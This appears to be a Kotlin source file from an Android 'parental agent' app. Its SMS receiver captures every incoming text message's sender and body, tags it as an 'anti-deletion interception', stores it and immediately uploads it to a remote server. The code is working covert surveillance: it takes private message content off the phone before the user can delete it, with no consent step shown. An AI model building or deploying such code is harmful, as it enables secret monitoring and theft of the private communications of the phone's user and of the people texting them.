package com.parental.agent.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.UUID

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action ||
            "android.provider.Telephony.SMS_DELIVER" == intent.action) {

            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) return

            val prefs = AppPreferences(context)
            val activeDeviceId = prefs.getDeviceId()

            for (sms in messages) {
                val sender = sms.originatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""
                val timestamp = sms.timestampMillis

                Log.i(TAG, "INSTANT ANTI-DELETION INTERCEPTION: Captured SMS from $sender BEFORE system deletion!")

                val payload = JSONObject().apply {
                    put("address", sender)
                    put("messageBody", body)
                    put("smsDate", timestamp)
                    put("direction", "RECEIVED")
                    put("antiDeletionCaptured", true)
                }

                val eventEntity = NormalizedEventEntity(
                    eventId = "evt_sms_" + UUID.randomUUID().toString(),
                    deviceId = activeDeviceId,
                    source = "sms",
                    eventType = "sms_record",
                    timestamp = timestamp,
                    collectionMethod = "broadcast_receiver",
                    payloadJson = payload.toString(),
                    isSynced = false
                )

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val database = AppDatabase.getInstance(context)
                        database.eventDao().insertEvent(eventEntity)

                        // Trigger instant 0-delay network sync
                        performInstantUpload(context, database, activeDeviceId)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in anti-deletion SMS capture: ${e.message}", e)
                    }
                }
            }
        }
    }

    private suspend fun performInstantUpload(context: Context, database: AppDatabase, activeDeviceId: String) {
        val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)

        if (unsyncedEvents.isNotEmpty()) {
            val eventPayloads = unsyncedEvents.map { entity ->
                val payloadMap = try {
                    val json = JSONObject(entity.payloadJson)
                    val map = mutableMapOf<String, Any?>()
                    json.keys().forEach { key -> map[key] = json.get(key) }
                    map
                } catch (e: Exception) {
                    emptyMap<String, Any?>()
                }

                mapOf(
                    "eventId" to entity.eventId,
                    "deviceId" to activeDeviceId,
                    "source" to entity.source,
                    "eventType" to entity.eventType,
                    "timestamp" to entity.timestamp,
                    "collectionMethod" to entity.collectionMethod,
                    "payload" to payloadMap
                )
            }

            val payload = SyncPayload(
                deviceId = activeDeviceId,
                events = eventPayloads
            )

            val response = ApiConstants.apiService.syncEvents(payload)

            if (response.isSuccessful && response.body()?.success == true) {
                val body = response.body()
                val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                val localEventIds = unsyncedEvents.map { it.eventId }
                val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                if (confirmedSyncedIds.isNotEmpty()) {
                    database.eventDao().markEventsSynced(confirmedSyncedIds)
                    Log.i(TAG, "SUCCESS: Instant SMS payload server confirmed for ${confirmedSyncedIds.size} event(s)!")
                }
            }
        }
    }
}
